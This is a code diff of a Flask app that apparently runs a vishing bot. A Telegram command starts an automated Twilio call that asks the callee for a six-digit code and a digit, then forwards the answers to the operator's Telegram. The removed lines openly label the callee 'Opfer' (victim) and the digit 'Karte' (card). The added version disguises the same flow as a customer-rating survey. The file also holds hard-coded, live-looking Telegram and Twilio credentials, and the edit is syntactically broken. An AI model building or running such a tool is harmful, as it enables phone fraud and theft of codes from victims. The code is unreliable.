@@ -1,123 +1,200 @@
 import os
 import requests
+import sqlite3
 from flask import Flask, request
 from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather
 
 app = Flask(__name__)
 
-# --- Configuración de Credenciales ---
-TELEGRAM_TOKEN = "8671100191:AAGnjEeOD4LUgQJiVzNj79-nWhdnh2neh90"
-CHAT_ID = "8225742299"
+# =========================
+# CONFIG (USA VARIABLES ENV EN PRODUCCIÓN)
+# =========================
+TELEGRAM_TOKEN = os.environ.get("8671100191:AAGnjEeOD4LUgQJiVzNj79-nWhdnh2neh90")
+ADMIN_CHAT_ID = os.environ.get("8225742299")
 
-TWILIO_SID = "ACd39155611dc69a0f0b049a178e61a5ec"
-TWILIO_AUTH = "aabbc52cd1ed16e8efbbc3d55fcff8dd"
-TWILIO_NUMBER = "+19783545896"
+TWILIO_SID = os.environ.get("ACd39155611dc69a0f0b049a178e61a5ec")
+TWILIO_AUTH = os.environ.get("aabbc52cd1ed16e8efbbc3d55fcff8dd")
+TWILIO_NUMBER = os.environ.get("+19783545896")
 
-client = Client(TWILIO_SID, TWILIO_AUTH)
+BOT_URL = f"https://api.telegram.org/bot8671100191:AAGnjEeOD4LUgQJiVzNj79-nWhdnh2neh90"
 
-# --- Funciones Auxiliares ---
-def send_to_telegram(message):
-    """Envía un mensaje de texto al bot de Telegram configurado."""
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": message
-    }
+client = Client(ACd39155611dc69a0f0b049a178e61a5ec, aabbc52cd1ed16e8efbbc3d55fcff8dd)
+
+# =========================
+# DB INIT
+# =========================
+def init_db():
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS reviews (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            phone TEXT,
+            customer_id TEXT,
+            rating TEXT
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# =========================
+# MEMORY SIMPLE (estado usuario)
+# =========================
+user_state = {}
+
+# =========================
+# TELEGRAM SEND
+# =========================
+def send_telegram(chat_id, text):
+    requests.post(f"{BOT_URL}/sendMessage", data={
+        "chat_id": chat_id,
+        "text": text
+    })
+
+# =========================
+# TWILIO CALL
+# =========================
+def make_call(number):
     try:
-        requests.post(url, data=payload)
+        call = client.calls.create(
+            to=number,
+            from_=+19783545896,
+            url="https://simplebot-2cgu.onrender.com/call"
+        )
+        print("CALL SID:", call.sid)
+        return True
     except Exception as e:
-        print(f"Error enviando a Telegram: {e}")
+        print("CALL ERROR:", e)
+        return False
 
-# --- Rutas de la Aplicación ---
-
-@app.route("/webhook", methods=["POST"])
-def webhook():
-    data = request.json
-    print("RECIBIDO:", data)
-    return "ok", 200
-
+# =========================
+# TELEGRAM WEBHOOK
+# =========================
 @app.route("/telegram", methods=["POST"])
 def telegram():
-    data = request.json
+    data = request.get_json()
+
     if not data or "message" not in data:
         return "ok", 200
 
-    text = data["message"].get("text", "")
-    chat_id = data["message"]["chat"]["id"]
+    msg = data["message"]
+    text = msg.get("text", "").strip()
+    chat_id = str(msg["chat"]["id"])
 
+    # START FLOW
     if text == "/start":
-        url_tg = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        requests.post(url_tg, data={
-            "chat_id": chat_id,
-            "text": "𝕯𝖆𝖘 𝕿𝖔𝖔𝖑 𝖋𝖚𝖓𝖐𝖙𝖎𝖔𝖓𝖎𝖊𝖗𝖙, 𝖘𝖈𝖍𝖎𝖈𝖐𝖊𝖓 𝕾𝖎𝖊 𝖒𝖎𝖗 𝖉𝖆𝖘 𝕺𝖕𝖋𝖊𝖗 💸 ."
-        })
-        return "ok", 200
+        user_state[chat_id] = {"step": "phone"}
 
-    if text.startswith("+"):
-        # Inicia la llamada de Twilio
-        client.calls.create(
-            to=text,
-            from_=TWILIO_NUMBER,
-            url="https://bot-zyqo.onrender.com/call"
+        send_telegram(chat_id,
+            "👋 Bienvenido\n\nEnvía el número a llamar (formato +549...):"
         )
-        send_to_telegram(f"Llamando a {text}")
         return "ok", 200
 
+    # STEP 1: phone number
+    if chat_id in user_state and user_state[chat_id]["step"] == "phone":
+        user_state[chat_id]["phone"] = text
+        user_state[chat_id]["step"] = "customer"
+
+        ok = make_call(text)
+
+        if ok:
+            send_telegram(chat_id, f"📞 Llamando a {text}")
+        else:
+            send_telegram(chat_id, "❌ Error al iniciar llamada")
+
+        return "ok", 200
+
+    send_telegram(chat_id, "Escribe /start para comenzar.")
     return "ok", 200
 
+# =========================
+# TWILIO CALL FLOW
+# =========================
 @app.route("/call", methods=["POST"])
 def call():
     response = VoiceResponse()
-    # Gather captura la entrada DTMF (teclas marcadas)
+
     gather = Gather(
         input="dtmf",
         num_digits=6,
-        action="/rating"
+        action="/rating",
+        timeout=10
     )
-    gather.say("Ingrese su numero de cliente.", language="es-MX")
+
+    gather.say("Ingrese su número de cliente.", language="es-ES")
     response.append(gather)
+
+    response.redirect("/call")
     return str(response)
 
+# =========================
+# RATING STEP
+# =========================
 @app.route("/rating", methods=["POST"])
 def rating():
-    customer_id = request.form.get("Digits")
+    customer_id = request.form.get("Digits", "")
+
     response = VoiceResponse()
-    
-    # Pasamos el customer_id como argumento en la URL de la acción
+
     gather = Gather(
         input="dtmf",
         num_digits=1,
-        action=f"/save?customer_id={customer_id}"
+        action=f"/save?customer_id={customer_id}",
+        timeout=10
     )
-    gather.say("Califique su experiencia del uno al cinco.", language="es-MX")
+
+    gather.say("Califique del 1 al 5.", language="es-ES")
+
     response.append(gather)
+    response.redirect(f"/rating?customer_id={customer_id}")
+
     return str(response)
 
+# =========================
+# SAVE RESULT
+# =========================
 @app.route("/save", methods=["POST"])
 def save():
     customer_id = request.args.get("customer_id")
-    rating_value = request.form.get("Digits")
+    rating = request.form.get("Digits")
     phone = request.form.get("From")
 
-    # Formateo del mensaje para Telegram
-    mensaje = (
-        f"⛧ 𝕹𝖊𝖚𝖊𝖘 𝕺𝖕𝖋𝖊𝖗 ⛧\n"
-        f"• ℭ𝔬𝔡𝔢 :{customer_id}\n"
-        f"• 𝔒𝔭𝔣𝔢𝔯: {phone}\n"
-        f"• 𝔎𝔞𝔯𝔱𝔢: {rating_value}\n"
-        f"⸸ 𝕸𝖊𝖎𝖓 𝖌𝖗𝖔𝖘𝖙𝖊𝖘 𝕲𝖑𝖚𝖈𝖐, 𝖉𝖊𝖎𝖓 𝖌𝖗𝖔𝖘𝖙𝖊𝖘 𝖀𝖓𝖌𝖑𝖚𝖈𝖐 ⸸"
+    # SAVE DB
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO reviews (phone, customer_id, rating) VALUES (?, ?, ?)",
+        (phone, customer_id, rating)
     )
-    
-    send_to_telegram(mensaje)
+    conn.commit()
+    conn.close()
+
+    # SEND TO ADMIN TELEGRAM
+    send_telegram(ADMIN_CHAT_ID,
+        f"📞 NUEVA LLAMADA\n\n"
+        f"📱 {phone}\n"
+        f"🧾 Cliente: {customer_id}\n"
+        f"⭐ Rating: {rating}"
+    )
 
     response = VoiceResponse()
-    response.say("Gracias por su respuesta. Hasta luego.", language="es-MX")
+    response.say("Gracias. Su respuesta fue registrada.", language="es-ES")
+
     return str(response)
 
-# --- Bloque de ejecución principal ---
+# =========================
+# HOME
+# =========================
+@app.route("/", methods=["GET"])
+def home():
+    return "Bot activo 🚀", 200
+
+# =========================
+# RUN
+# =========================
 if __name__ == "__main__":
-    # Render y otros servicios de hosting usan la variable de entorno PORT
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
-  
